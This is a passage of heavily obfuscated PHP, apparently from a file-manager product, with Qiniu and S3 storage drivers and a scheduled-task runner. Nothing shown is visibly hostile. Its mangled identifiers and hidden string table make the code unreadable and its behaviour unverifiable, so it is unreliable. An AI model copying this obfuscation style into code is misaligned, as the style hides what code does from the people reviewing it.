$ô±‘–Ãş)) { $this->tempFileRemve($ô±‘–Ãş); return !0; } return !1; } public function refreshUrls($Õê©ÎÀœ) { $—ˆ‰Èß =& $_SERVER[è¶³ÒßÑ]; $É˜‹Áşè = array(); if (is_array($Õê©ÎÀœ)) { foreach ($Õê©ÎÀœ as $×‡²²¼¸) { $É˜‹Áşè[] = $this->link($×‡²²¼¸); } } else { $É˜‹Áşè[] = $this->link($Õê©ÎÀœ); } $€ªÀÉªØ = new Qiniu\Cdn\CdnManager($this->auth); list($ºùòŸÕ, $åÀ–êŸË) = $€ªÀÉªØ->refreshUrls($É˜‹Áşè); if ($åÀ–êŸË) { return !1; } return $ºùòŸÕ[$—ˆ‰Èß[1239]] == $—ˆ‰Èß[813] ? !0 : !1; } public function fileSubstr($åİ‚Ô®·, $Î¤™ßÒª, $ß±ğ¸äĞ) { $¾½ƒë–Õ =& $_SERVER[è¶³ÒßÑ]; if (!($ä¦…‰‹ = $this->link($åİ‚Ô®·))) { return !1; } $˜°ûÓ£Ğ = !1; if ($ß±ğ¸äĞ > 0) { $ê³œŒû = $Î¤™ßÒª + $ß±ğ¸äĞ - 1; $˜°ûÓ£Ğ = array($¾½ƒë–Õ[1513] . $Î¤™ßÒª . $¾½ƒë–Õ[455] . $ê³œŒû); } $ÇˆÎºò = url_request($ä¦…‰‹, $¾½ƒë–Õ[271], !1, $˜°ûÓ£Ğ); return $ÇˆÎºò[$¾½ƒë–Õ[804]] ? $ÇˆÎºò[$¾½ƒë–Õ[1262]] : !1; } public function upload($‹Ï²öé, $çáª¾´¸, $ÖéÍ¼Ğï = false, $ÙÌ²â ‡ = REPEAT_REPLACE) { $¿ïÌÏÈ† = new Qiniu\Storage\UploadManager(); $•äÀ·á© = $this->auth->uploadToken($this->bucket, $‹Ï²öé); $†òµûÏ = get_file_mime(get_path_ext($çáª¾´¸)); list($Ú²´ù¨ª, $Ö³Šìî) = $¿ïÌÏÈ†->putFile($•äÀ·á©, $‹Ï²öé, $çáª¾´¸, null, $†òµûÏ); return $Ö³Šìî ? !1 : $this->getPathOuter($‹Ï²öé); } public function uploadFormData($” ôâš, $ã­íšª‹ = 3600) { return $this->uploadToken($” ôâš, $ã­íšª‹); } public function multiUploadFormData($ğë«ºª, $™ƒ®êšÅ = 3600) { return $this->uploadToken($ğë«ºª, $™ƒ®êšÅ); } private function uploadToken($Öéõ¶£õ, $£†Ëı = 3600) { $™ôÎËˆ• =& $_SERVER[è¶³ÒßÑ]; $òü‡¡™Í = $£†Ëı; $¨©™‘ó = array($™ôÎËˆ•[1514] => $™ôÎËˆ•[1515]); $úÆÚ¹Àë = $Öéõ¶£õ; $­ñµğ±è = $this->auth->uploadToken($this->bucket, $úÆÚ¹Àë, $òü‡¡™Í, $¨©™‘ó, !0); $İ½¥±®´ = empty($this->region) || $this->region == $™ôÎËˆ•[1516] ? $™ôÎËˆ•[12] : $™ôÎËˆ•[455] . $this->region; $æĞÅŠ = http_type() . "\x3a\57\57\165\x70\x6c\x6f\x61\144{$İ½¥±®´}\x2e\x71\151\x6e\151\165\x70\56\x63\157\155\x2f"; return array($™ôÎËˆ•[1517] => $­ñµğ±è, $™ôÎËˆ•[1518] => $æĞÅŠ); } public function download($ÂŠÖü›ö, $€¼ÍÁ£) { $šæ±‘Ä– = IO::getPathInner(IO::mkfile($€¼ÍÁ£)); if (!($š²×ºŞ = $this->link($ÂŠÖü›ö))) { return !1; } $ª¨´– = 0; $¶—Å­Á¨ = 1024 * 200; $è¿Ä½Ô = fopen($šæ±‘Ä–, $_SERVER[è¶³ÒßÑ][1519]); while (!0) { $ôŞöêÛØ = $this->fileSubstr($ÂŠÖü›ö, $ª¨´–, $¶—Å­Á¨); if ($ôŞöêÛØ === !1) { return !1; } fwrite($è¿Ä½Ô, $ôŞöêÛØ); $ª¨´– += $¶—Å­Á¨; if (strlen($ôŞöêÛØ) < $¶—Å­Á¨) { break; } } fclose($è¿Ä½Ô); return $€¼ÍÁ£; } public function link($¯‘™íÚ, $à²á®ã = '') { if (!$this->isFile($¯‘™íÚ)) { return !1; } $Ë©Ö³ì = $this->getHost() . $_SERVER[è¶³ÒßÑ][8] . $this->pathEncode($¯‘™íÚ) . $à²á®ã; return $this->auth->privateDownloadUrl($Ë©Ö³ì, 3600 * 12); } public function fileOut($ü¹åˆÚÌ, $µò­¼‚¹ = false, $à¯å–‚Š = false, $´£¶Áè© = '') { $¹™…æıØ =& $_SERVER[è¶³ÒßÑ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ü¹åˆÚÌ, $µò­¼‚¹, $à¯å–‚Š, $´£¶Áè©); } if (!$à¯å–‚Š) { $à¯å–‚Š = $this->pathThis($ü¹åˆÚÌ); } $Şêƒ¡ä› = $µò­¼‚¹ ? $¹™…æıØ[1520] . rawurlencode($à¯å–‚Š) : $¹™…æıØ[12]; $÷ç¼âİĞ = $this->link($ü¹åˆÚÌ, $Şêƒ¡ä›); $this->fileOutLink($÷ç¼âİĞ); } public function fileOutServer($£‹¤ü€ß, $Ñ×¢½Î = false, $Á…®”¡ = false, $Ä¤œò×ğ = '') { parent::fileOut($£‹¤ü€ß, $Ñ×¢½Î, $Á…®”¡, $Ä¤œò×ğ); } public function fileOutImage($Î³·…àå, $æÆ“‘¹ = 250) { if ($this->size($Î³·…àå) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Î³·…àå, $æÆ“‘¹); } $Ç˜Ëå¨³ = $this->link($Î³·…àå, $_SERVER[è¶³ÒßÑ][1521] . $æÆ“‘¹); $this->fileOutLink($Ç˜Ëå¨³); } public function fileOutImageServer($¬îœÇÙå, $¥‰œÄĞ = 250) { parent::fileOutImage($¬îœÇÙå, $¥‰œÄĞ); } public function hashMd5($£„—àË…) { $åÌÅû =& $_SERVER[è¶³ÒßÑ]; $¶Ä×’‹ = $this->objectMeta($£„—àË…); return isset($¶Ä×’‹[$åÌÅû[255]]) ? $¶Ä×’‹[$åÌÅû[255]] : !1; $á ÄàÙŠ = $this->link($£„—àË…, $åÌÅû[1522]); } public function size($”ĞÛÄ¾…) { $ÉˆÆ‚À€ = $this->objectMeta($”ĞÛÄ¾…); return $ÉˆÆ‚À€ ? $ÉˆÆ‚À€[$_SERVER[è¶³ÒßÑ][89]] : 0; } public function info($·ÜõÖÉ) { if ($this->isFolder($·ÜõÖÉ)) { return $this->folderInfo($·ÜõÖÉ); } else { if ($this->isFile($·ÜõÖÉ)) { return $this->fileInfo($·ÜõÖÉ); } } return !1; } public function exist($²¡ğı™¾) { return $this->isFile($²¡ğı™¾) || $this->isFolder($²¡ğı™¾); } public function isFile($ÈÁæ†–) { return !$this->isFolder($ÈÁæ†–) && $this->objectMeta($ÈÁæ†–); } public function isFolder($àš¸êì­) { return $this->cacheMethod($_SERVER[è¶³ÒßÑ][189], $àš¸êì­); } protected function objectMeta($İøÔÂ½Ø) { return $this->cacheMethod($_SERVER[è¶³ÒßÑ][191], $İøÔÂ½Ø); } protected function _objectMeta($Ëä¨—™) { $ç™Óëşù =& $_SERVER[è¶³ÒßÑ]; list($äŞâß±î, $ÄóÆë¾ß) = $this->bucketManager->stat($this->bucket, $Ëä¨—™); if ($äŞâß±î) { $äŞâß±î[$ç™Óëşù[89]] = intval($äŞâß±î[$ç™Óëşù[1508]]); } return $äŞâß±î; } protected function _isFolder($İ´şÌØÎ) { $ã ¼Óñ =& $_SERVER[è¶³ÒßÑ]; if ($İ´şÌØÎ == $ã ¼Óñ[12] || $İ´şÌØÎ == $ã ¼Óñ[8]) { return !0; } list($º°¿ÁÃË, $óºúòÅ‚) = $this->bucketManager->listFiles($this->bucket, trim($İ´şÌØÎ, $ã ¼Óñ[8]) . $ã ¼Óñ[8], $ã ¼Óñ[12], 1, $ã ¼Óñ[8]); return !empty($º°¿ÁÃË[$ã ¼Óñ[1511]]) || !empty($º°¿ÁÃË[$ã ¼Óñ[1512]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($è¤ã†¦) { parent::__construct($è¤ã†¦); } public function uploadFormData($¯öïÁºˆ, $Ù¹Ì—´– = 3600) { $ÕŸÂæ =& $_SERVER[è¶³ÒßÑ]; $è±¹®ŸÊ = $ÕŸÂæ[239]; $ŒÀ²¿¦ = $ÕŸÂæ[279]; $Š˜­‡© = $ÕŸÂæ[72]; $Ã÷¡÷½ = gmdate($ÕŸÂæ[280]); $íšˆàáÜ = gmdate($ÕŸÂæ[281]); $ø°ÜùŸĞ = $ÕŸÂæ[282]; $Ôí§õò„ = $Ù¹Ì—´– . $ÕŸÂæ[12]; $£„×Åö² = $ÕŸÂæ[283]; $‡µ™­„“ = array($this->accessKey, $íšˆàáÜ, $this->region, $Š˜­‡©, $ø°ÜùŸĞ); $Ã£–È”· = implode($ÕŸÂæ[8], $‡µ™­„“); $¦î´ıîœ = array($ÕŸÂæ[284] => gmdate($ÕŸÂæ[1387], strtotime($ÕŸÂæ[286])), $ÕŸÂæ[287] => array(array($ÕŸÂæ[288] => $this->bucket), array($ÕŸÂæ[289] => $è±¹®ŸÊ), array($ÕŸÂæ[290], $ÕŸÂæ[291], $ÕŸÂæ[12]), array($ÕŸÂæ[290], $ÕŸÂæ[292], $ÕŸÂæ[12]), array($ÕŸÂæ[290], $ÕŸÂæ[293], $ÕŸÂæ[12]), array($ÕŸÂæ[294] => $£„×Åö²), array($ÕŸÂæ[295] => $Ã£–È”·), array($ÕŸÂæ[296] => $ŒÀ²¿¦), array($ÕŸÂæ[297] => $Ã÷¡÷½), array($ÕŸÂæ[298] => $Ôí§õò„))); $“˜Ïü¬ = base64_encode(json_encode($¦î´ıîœ)); $¥á¢¬‚¡ = hash_hmac($ÕŸÂæ[299], $íšˆàáÜ, $ÕŸÂæ[300] . $this->secret, !0); $µ“ºê… = hash_hmac($ÕŸÂæ[299], $this->region, $¥á¢¬‚¡, !0); $¸×şÚ¾ = hash_hmac($ÕŸÂæ[299], $Š˜­‡©, $µ“ºê…, !0); $•Öƒ“İ = hash_hmac($ÕŸÂæ[299], $ø°ÜùŸĞ, $¸×şÚ¾, !0); $šø›”û = hash_hmac($ÕŸÂæ[299], $“˜Ïü¬, $•Öƒ“İ); $¡ìĞÔ¡ = array($ÕŸÂæ[256] => $ÕŸÂæ[12], $ÕŸÂæ[301] => $ÕŸÂæ[12], $ÕŸÂæ[289] => $è±¹®ŸÊ, $ÕŸÂæ[294] => $£„×Åö², $ÕŸÂæ[302] => $“˜Ïü¬, $ÕŸÂæ[303] => $Ã£–È”·, $ÕŸÂæ[304] => $ŒÀ²¿¦, $ÕŸÂæ[305] => $Ã÷¡÷½, $ÕŸÂæ[306] => $Ôí§õò„, $ÕŸÂæ[307] => $šø›”û, $ÕŸÂæ[218] => $this->getHost()); return $¡ìĞÔ¡; } public function multiUploadFormData($ÌœÆÉª, $ãæøøŞ¾ = 3600) { $û“¨ã =& $_SERVER[è¶³ÒßÑ]; $€¤ËØ ° = gmdate($û“¨ã[1523]); $ÎêçåÒ = array(); $¬÷ØÌ€¤ = $this->client->getUploadId($this->bucket, $ÌœÆÉª, $ÎêçåÒ); if (!$¬÷ØÌ€¤) { return !1; } return array($û“¨ã[264] => $¬÷ØÌ€¤, $û“¨ã[218] => $this->getHost() . $û“¨ã[8] . $this->pathEncode($ÌœÆÉª), $û“¨ã[265] => $€¤ËØ °, $û“¨ã[107] => $ÌœÆÉª); } public function multiUploadAuthData($ÄãÇËö, $ñé—Î°Ù = array()) { $î‘¹†òç =& $_SERVER[è¶³ÒßÑ]; $Â—›·á© = isset($ñé—Î°Ù[$î‘¹†òç[179]]) ? $ñé—Î°Ù[$î‘¹†òç[179]] : $î‘¹†òç[12]; $×¶ƒÆĞ÷ = $ñé—Î°Ù[$î‘¹†òç[107]]; unset($ñé—Î°Ù[$î‘¹†òç[107]]); if (isset($ñé—Î°Ù[$î‘¹†òç[266]])) { return $this->listUploadParts($×¶ƒÆĞ÷, $ñé—Î°Ù); } $ñÜöÉŒ = array(); if (isset($ñé—Î°Ù[$î‘¹†òç[1524]])) { $ñÜöÉŒ[$î‘¹†òç[1525]] = $ñé—Î°Ù[$î‘¹†òç[1524]]; } $šşÔ€¿ = explode($î‘¹†òç[220], $this->getHost()); $ğ¬Ô‚§É = array($î‘¹†òç[1526] => $šşÔ€¿[1], $î‘¹†òç[1527] => $î‘¹†òç[12], $î‘¹†òç[256] => $î‘¹†òç[133], $î‘¹†òç[301] => $ñé—Î°Ù[$î‘¹†òç[89]]); $Õ©©‰¼ = $î‘¹†òç[269]; $½½ÇùÚº = $î‘¹†òç[8] . $this->pathEncode($×¶ƒÆĞ÷) . $Â—›·á©; $æ‰´ßö— = $this->client->__getSignatureV4($ñÜöÉŒ, $ğ¬Ô‚§É, $Õ©©‰¼, $½½ÇùÚº); if (strpos($Â—›·á©, $î‘¹†òç[268]) === 0) { if (isset($ñÜöÉŒ[$î‘¹†òç[1525]])) { $ïŠã“ÌĞ = $ñÜöÉŒ[$î‘¹†òç[1525]]; } else { if (isset($æ‰´ßö—[$î‘¹†òç[1525]])) { $ïŠã“ÌĞ = $æ‰´ßö—[$î‘¹†òç[1525]]; } else { $ïŠã“ÌĞ = hash($î‘¹†òç[299], $î‘¹†òç[12]); } } return array($î‘¹†òç[274] => $æ‰´ßö—[$î‘¹†òç[274]], $î‘¹†òç[1525] => $ïŠã“ÌĞ, $î‘¹†òç[265] => $æ‰´ßö—[$î‘¹†òç[1528]]); } return $æ‰´ßö—[$î‘¹†òç[274]]; } public function listUploadParts($³šİıóª, $Öíˆüûü = array()) { $•Ÿ½Ÿ–¶ =& $_SERVER[è¶³ÒßÑ]; $øà§ÂÔİ = str_replace($•Ÿ½Ÿ–¶[275], $•Ÿ½Ÿ–¶[12], $Öíˆüûü[$•Ÿ½Ÿ–¶[179]]); $í¥ï¼ğ = $this->client->listParts($this->bucket, $³šİıóª, $øà§ÂÔİ); if (!$í¥ï¼ğ) { return !1; } $ßüàúÕº = $•Ÿ½Ÿ–¶[1529]; foreach ($í¥ï¼ğ as $•ïŒšøß) { $ßüàúÕº .= $•Ÿ½Ÿ–¶[1530] . "\x3c\120\141\162\x74\116\165\x6d\142\x65\162\x3e{$•ïŒšøß[$•Ÿ½Ÿ–¶[1458]]}\x3c\57\x50\141\162\164\116\165\x6d\x62\145\162\76\12" . "\74\x45\x54\x61\147\76{$•ïŒšøß[$•Ÿ½Ÿ–¶[1459]]}\x3c\57\105\124\141\147\76\12" . $•Ÿ½Ÿ–¶[1531]; } $ßüàúÕº .= $•Ÿ½Ÿ–¶[1532]; $ã¼ñˆ›œ = array(); $º’ï‚ï  = explode($•Ÿ½Ÿ–¶[220], $this->getHost()); $âä¯¸Š‘ = array($•Ÿ½Ÿ–¶[1526] => $º’ï‚ï [1], $•Ÿ½Ÿ–¶[256] => $•Ÿ½Ÿ–¶[133], $•Ÿ½Ÿ–¶[301] => strlen($ßüàúÕº)); $À½Ôå†„ = $•Ÿ½Ÿ–¶[267]; $ÛäÏÓ·ı = $•Ÿ½Ÿ–¶[8] . $this->pathEncode($³šİıóª) . $Öíˆüûü[$•Ÿ½Ÿ–¶[179]]; $ôâ¢ÖºÒ = $this->client->__getSignatureV4($ã¼ñˆ›œ, $âä¯¸Š‘, $À½Ôå†„, $ÛäÏÓ·ı, $ßüàúÕº); return array($•Ÿ½Ÿ–¶[274] => $ôâ¢ÖºÒ[$•Ÿ½Ÿ–¶[274]], $•Ÿ½Ÿ–¶[265] => $ôâ¢ÖºÒ[$•Ÿ½Ÿ–¶[1528]], $•Ÿ½Ÿ–¶[276] => $í¥ï¼ğ, $•Ÿ½Ÿ–¶[1525] => $ôâ¢ÖºÒ[$•Ÿ½Ÿ–¶[1525]]); } public function link($İ™ºî“Û, $çôŒşç‚ = array()) { return parent::link($İ™ºî“Û, $çôŒşç‚); } public function fileOut($£¬ÄÎ®’, $Ñ¤âöÛ“ = false, $öæ×ãŸ = false, $‡«á²ˆ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[è¶³ÒßÑ][1533])) { return parent::fileOutServer($£¬ÄÎ®’, $Ñ¤âöÛ“, $öæ×ãŸ, $‡«á²ˆ); } parent::fileOut($£¬ÄÎ®’, $Ñ¤âöÛ“, $öæ×ãŸ, $‡«á²ˆ); } public function fileOutImage($ïÚüòÇ, $î¢Àµ³˜ = 250) { if (strstr($this->endpoint, $_SERVER[è¶³ÒßÑ][1533])) { return parent::fileOutImageServer($ïÚüòÇ, $î¢Àµ³˜); } parent::fileOutImage($ïÚüòÇ, $î¢Àµ³˜); } public function fileOutLink($íŠñŸøã) { $ºƒ©Òé =& $_SERVER[è¶³ÒßÑ]; if (substr($íŠñŸøã, 0, 7) == $ºƒ©Òé[1385]) { $íŠñŸøã = $ºƒ©Òé[1386] . substr($íŠñŸøã, 7); } header($ºƒ©Òé[185] . $íŠñŸøã); die; } } goto b•Õ×÷¤·Ù; b¦¾ƒ¢Ø¡¿: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Ãˆ¥Öé¡ =& $_SERVER[è¶³ÒßÑ]; if (self::valueGet($Ãˆ¥Öé¡[804]) != $Ãˆ¥Öé¡[101]) { return; } if (self::valueGet($Ãˆ¥Öé¡[1711]) == $Ãˆ¥Öé¡[101]) { $š¶·ã× = self::valueGet($Ãˆ¥Öé¡[1712]); if (time() - $š¶·ã× > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($Ãˆ¥Öé¡[1711], $Ãˆ¥Öé¡[101]); self::log($Ãˆ¥Öé¡[1713] . ACTION . $Ãˆ¥Öé¡[1714]); Hook::bind($Ãˆ¥Öé¡[1715], $Ãˆ¥Öé¡[1716]); $éàÒü»¾ = 0; while (!0) { self::cacheClear(); if (self::valueGet($Ãˆ¥Öé¡[804]) != $Ãˆ¥Öé¡[101]) { self::valueSet($Ãˆ¥Öé¡[1711], $Ãˆ¥Öé¡[238]); self::log($Ãˆ¥Öé¡[1717]); die; } $¾©øçô¥ = time(); if ($¾©øçô¥ - $éàÒü»¾ >= 60) { self::valueSet(array($Ãˆ¥Öé¡[1711] => $Ãˆ¥Öé¡[101], $Ãˆ¥Öé¡[1712] => $¾©øçô¥)); $éàÒü»¾ = $¾©øçô¥; } if (!file_exists(USER_SYSTEM . $Ãˆ¥Öé¡[1718])) { self::valueSet(array($Ãˆ¥Öé¡[1711] => $Ãˆ¥Öé¡[238], $Ãˆ¥Öé¡[804] => $Ãˆ¥Öé¡[238])); self::log($Ãˆ¥Öé¡[1719]); die; } $êİ›ü¹… = file_get_contents(BASIC_PATH . $Ãˆ¥Öé¡[1720]); $¥†‘Èõ© = KOD_VERSION . $Ãˆ¥Öé¡[10] . KOD_VERSION_BUILD; $óŞü¾–Ò = match_text($êİ›ü¹…, $Ãˆ¥Öé¡[1721]) . $Ãˆ¥Öé¡[10] . match_text($êİ›ü¹…, $Ãˆ¥Öé¡[1722]); if ($óŞü¾–Ò != $¥†‘Èõ©) { self::restart(); self::log("\163\164\157\x70\145\x64\56\x5b\x76\145\x72\x73\151\x6f\156\x20\165\160\x64\141\x74\x65\x3b{$versionNow}\x20\75\x3e\40{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $¦î÷Ä›Û =& $_SERVER[è¶³ÒßÑ]; http_close(); $GLOBALS[$¦î÷Ä›Û[1723]] = 1; $_SERVER[$¦î÷Ä›Û[1724]] = $¦î÷Ä›Û[1725]; $_COOKIE = array(); $GLOBALS[$¦î÷Ä›Û[1726]] = 1; $GLOBALS[$¦î÷Ä›Û[1727]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $õ§´ÓĞ« =& $_SERVER[è¶³ÒßÑ]; http_close(); self::valueSet($õ§´ÓĞ«[804], $õ§´ÓĞ«[238]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($õ§´ÓĞ«[1711] => $õ§´ÓĞ«[238], $õ§´ÓĞ«[804] => $õ§´ÓĞ«[101])); self::log($õ§´ÓĞ«[1728]); } public static function taskSwitch() { $æ†ğ÷¯Å =& $_SERVER[è¶³ÒßÑ]; $ŠÜÓõÛş = self::valueGet($æ†ğ÷¯Å[804]) == $æ†ğ÷¯Å[101] ? $æ†ğ÷¯Å[238] : $æ†ğ÷¯Å[101]; self::valueSet($æ†ğ÷¯Å[804], $ŠÜÓõÛş); } public static function shutdownEvent() { $Œ ·§ë± =& $_SERVER[è¶³ÒßÑ]; self::valueSet($Œ ·§ë±[1711], $Œ ·§ë±[238]); self::log($Œ ·§ë±[1729]); } public static function config($±™”óã, $Î•ÒÂ©) { self::valueSet($_SERVER[è¶³ÒßÑ][804], $±™”óã); } private static function taskRunAll() { $±â ı»· =& $_SERVER[è¶³ÒßÑ]; $‘¡ÈÔäâ = timeFloat(); $¾„Ğ‰©Ê = Model($±â ı»·[1730])->listData(); $éïúøµ = count($¾„Ğ‰©Ê); for ($úÀá£û² = 0; $úÀá£û² < $éïúøµ; $úÀá£û²++) { $µºÌ÷Íğ = $¾„Ğ‰©Ê[$úÀá£û²]; if (!$µºÌ÷Íğ[$±â ı»·[468]] || $µºÌ÷Íğ[$±â ı»·[1731]] != $±â ı»·[101]) { continue; } if (!self::taskTimeCheck($µºÌ÷Íğ)) { continue; } self::taskRun($µºÌ÷Íğ); } Hook::trigger($±â ı»·[1732]); self::taskQueueRun($‘¡ÈÔäâ); } private static function taskQueueRun($÷ù£éõ­) { $¸–—ãô = 10; while (!0) { $ø…¹ëê– = TaskQueue::run(); if ($ø…¹ëê– === !1) { break; } if (timeFloat() - $÷ù£éõ­ >= $¸–—ãô) { break; } } } private static function taskTimeCheck($Ë‹÷å„ü) { $ãª¶Ğó =& $_SERVER[è¶³ÒßÑ]; $ÒŞÄ£³˜ = json_decode($Ë‹÷å„ü[$ãª¶Ğó[216]], !0); $™Ô‡¡şÓ = intval($Ë‹÷å„ü[$ãª¶Ğó[1712]]); $áÌ¾¯øĞ = strtotime($ãª¶Ğó[1733] . $ÒŞÄ£³˜[$ãª¶Ğó[1734]] . $ãª¶Ğó[1735]) - strtotime($ãª¶Ğó[1736]); $«úÒÃªú = time() - strtotime(date($ãª¶Ğó[1737]) . $ãª¶Ğó[1738]); $£àÏÓÇó = $«úÒÃªú >= $áÌ¾¯øĞ && $«úÒÃªú <= $áÌ¾¯øĞ + 3600; switch ($ÒŞÄ£³˜[$ãª¶Ğó[33]]) { case $ãª¶Ğó[1739]: if (time() - $™Ô‡¡şÓ < 3600 * 24 * 30) { return !1; } if ($ÒŞÄ£³˜[$ãª¶Ğó[1739]] == date($ãª¶Ğó[1740]) && $£àÏÓÇó) { return !0; } break; case $ãª¶Ğó[1741]: if (time() - $™Ô‡¡şÓ < 3600 * 24 * 7) { return !1; } $“ß¾™ŞŞ = date($ãª¶Ğó[1742]) == 0 ? 7 : date($ãª¶Ğó[1742]); if ($ÒŞÄ£³˜[$ãª¶Ğó[1741]] == $“ß¾™ŞŞ && $£àÏÓÇó) { return !0; } break; case $ãª¶Ğó[1734]: if (time() - $™Ô‡¡şÓ < 3600 * 24) { return !1; } if ($£àÏÓÇó) { return !0; } break; case $ãª¶Ğó[1743]: if (time() - $™Ô‡¡şÓ >= floatval($ÒŞÄ£³˜[$ãª¶Ğó[1743]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $çö“œË  =& $_SERVER[è¶³ÒßÑ]; static $×Ï÷„Òè = 0; $¼£µ©€¥ = 300; if (!$×Ï÷„Òè) { $×Ï÷„Òè = time(); } if (time() - $×Ï÷„Òè < $¼£µ©€¥) { return; } $×Ï÷„Òè = time(); $¶°Âß˜Ï = Model($çö“œË [570])->db($çö“œË [12]); if ($¶°Âß˜Ï) { $¶°Âß˜Ï->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($çö“œË [1744], $çö“œË [1745]); die; } } public static function taskRun($İÔüâà) { $Øùéú½Ä =& $_SERVER[è¶³ÒßÑ]; self::log($Øùéú½Ä[1746] . $İÔüâà[$Øùéú½Ä[468]] . $Øùéú½Ä[1747] . $İÔüâà[$Øùéú½Ä[32]] . $Øùéú½Ä[1748] . $İÔüâà[$Øùéú½Ä[1749]]); Model($Øùéú½Ä[1730])->run($İÔüâà[$Øùéú½Ä[468]]); $¦…è›‡Ä = timeFloat(); $ÍÔ’˜Î = $Øùéú½Ä[12]; switch ($İÔüâà[$Øùéú½Ä[33]]) { case $Øùéú½Ä[376]: $ÖåÕ‹Ş£ = url_request($İÔüâà[$Øùéú½Ä[1749]], $Øùéú½Ä[271], !1, !1, !1, !1, 10); if ($ÖåÕ‹Ş£[$Øùéú½Ä[804]]) { $ÍÔ’˜Î = strlen($ÖåÕ‹Ş£[$Øùéú½Ä[1262]]); } break; case $Øùéú½Ä[270]: $ÍÔ’˜Î = Hook::apply($İÔüâà[$Øùéú½Ä[1749]]); default: break; } Model($Øùéú½Ä[1750])->add(array($Øùéú½Ä[1751] => $Øùéú½Ä[12], $Øùéú½Ä[1752] => $Øùéú½Ä[238], $Øùéú½Ä[33] => $Øùéú½Ä[1753] . $İÔüâà[$Øùéú½Ä[468]], $Øùéú½Ä[1754] => json_encode(array($Øùéú½Ä[32] => $İÔüâà[$Øùéú½Ä[32]], $Øùéú½Ä[1755] => timeFloat() - $¦…è›‡Ä, $Øùéú½Ä[362] => $ÍÔ’˜Î)))); $œ¿ÇúÕ­ = $ÍÔ’˜Î ? $Øùéú½Ä[1756] . $ÍÔ’˜Î : $Øùéú½Ä[12]; self::log($Øùéú½Ä[1757] . $İÔüâà[$Øùéú½Ä[468]] . $Øùéú½Ä[188] . $œ¿ÇúÕ­); return !0; } public static function valueGet($ÈÉçü§Ş) { $¼À¯ÌÛ¿ =& $_SERVER[è¶³ÒßÑ]; $ù—¶ÖØˆ = $¼À¯ÌÛ¿[1758]; $Ã¯’øâ = Model($¼À¯ÌÛ¿[501])->get($ÈÉçü§Ş, $ù—¶ÖØˆ); if (is_null($Ã¯’øâ)) { Model($¼À¯ÌÛ¿[501])->set($¼À¯ÌÛ¿[804], $¼À¯ÌÛ¿[101], $ù—¶ÖØˆ); Model($¼À¯ÌÛ¿[501])->set($¼À¯ÌÛ¿[1711], $¼À¯ÌÛ¿[238], $ù—¶ÖØˆ); $Ã¯’øâ = Model($¼À¯ÌÛ¿[501])->get($ÈÉçü§Ş, $ù—¶ÖØˆ); } return $Ã¯’øâ; } private static function valueSet($ÉÂÀÔ´Ê, $ÅÌƒŒ«” = false) { $ûî™ú† =& $_SERVER[è¶³ÒßÑ]; $Á¸Ï‰Æ = $ûî™ú†[1759]; CacheLock::lock($Á¸Ï‰Æ); $ÃÓ¶úäæ = Model($ûî™ú†[501])->set($ÉÂÀÔ´Ê, $ÅÌƒŒ«”, $ûî™ú†[1758]); CacheLock::unlock($Á¸Ï‰Æ); return $ÃÓ¶úäæ; } protected static function log($Æ¾ææ¯ö) { write_log($Æ¾ææ¯ö, $_SERVER[è¶³ÒßÑ][1745]); } private static function cacheClear() { $¥€ê¨ó =& $_SERVER[è¶³ÒßÑ]; Cache::clearMemory(Model($¥€ê¨ó[501])->cacheKey($¥€ê¨ó[1758])); Cache::clearMemory(Model($¥€ê¨ó[501])->cacheKey($¥€ê¨ó[1760])); Model($¥€ê¨ó[1730])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\x6f\x70"; const STATYS_RUNNING = "\x72\165\x6e\156\151\x6e\x67"; const STATYS_KILL = "\x6b\x69\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($åÌò¡ÅÇ, $õü«‡­Ú = '', $§¾Ğ¹¾ì = 0, $ÓŸ“Ë¸ò = '') { $Öã¼¦…Ò =& $_SERVER[è¶³ÒßÑ]; if (self::get($åÌò¡ÅÇ)) { return; } $this->task = array($Öã¼¦…Ò[468] => $åÌò¡ÅÇ, $Öã¼¦…Ò[1761] => USER_ID, $Öã¼¦…Ò[1650] => $ÓŸ“Ë¸ò, $Öã¼¦…Ò[519] => $Öã¼¦…Ò[12], $Öã¼¦…Ò[33] => $õü«‡­Ú, $Öã¼¦…Ò[1118] => $Öã¼¦…Ò[12], $Öã¼¦…Ò[1116] => $§¾Ğ¹¾ì, $Öã¼¦…Ò[1762] => 0, $Öã¼¦…Ò[1763] => 0, $Öã¼¦…Ò[1764] => 0, $Öã¼¦…Ò[1765] => timeFloat(), $Öã¼¦…Ò[1766] => 0, $Öã¼¦…Ò[1767] => 0, $Öã¼¦…Ò[1768] => 0, $Öã¼¦…Ò[1769] => 0, $Öã¼¦…Ò[804] => $Öã¼¦…Ò[1711]); $GLOBALS[$Öã¼¦…Ò[1770]] = 1; Hook::bind($Öã¼¦…Ò[1715], array($this, $Öã¼¦…Ò[1771])); Hook::bind($Öã¼¦…Ò[1772], array($this, $Öã¼¦…Ò[1773])); $this->startAfter(); Hook::trigger($Öã¼¦…Ò[1774], $this->task); $this->task[$Öã¼¦…Ò[1767]] = timeFloat(); } public function end($Ğ‘éîÛ = '') { $Ñ¤Êñ¶» =& $_SERVER[è¶³ÒßÑ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$Ñ¤Êñ¶»[1767]]) { self::valueSet($this->task[$Ñ¤Êñ¶»[468]], !1); } $this->isEnd = !0; if ($Ğ‘éîÛ) { $this->task[$Ñ¤Êñ¶»[519]] = $Ğ‘éîÛ; } self::log($Ñ¤Êñ¶»[1775] . $this->task[$Ñ¤Êñ¶»[468]] . $Ñ¤Êñ¶»[1776] . sprintf($Ñ¤Êñ¶»[904], timeFloat() - $this->task[$Ñ¤Êñ¶»[1765]]) . $Ñ¤Êñ¶»[1777]); 